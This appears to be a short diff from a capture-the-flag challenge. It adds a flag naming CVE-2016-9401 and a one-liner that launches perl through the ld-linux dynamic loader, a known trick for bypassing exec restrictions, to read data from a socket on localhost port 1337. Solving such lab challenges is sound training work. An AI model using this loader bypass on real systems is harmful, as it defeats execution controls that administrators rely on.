@@ -1,0 +1,2 @@
+FLAG{1nt3nt3d_s0luti0n_1s_CVE-2016-9401_;)}
+/lib64/ld-linux-x86-64.so.2 /usr/bin/perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new(PeerAddr=>"127.0.0.1",PeerPort=>1337,Proto=>"tcp") or die $!; sysread($s,$b,4096); print $b'
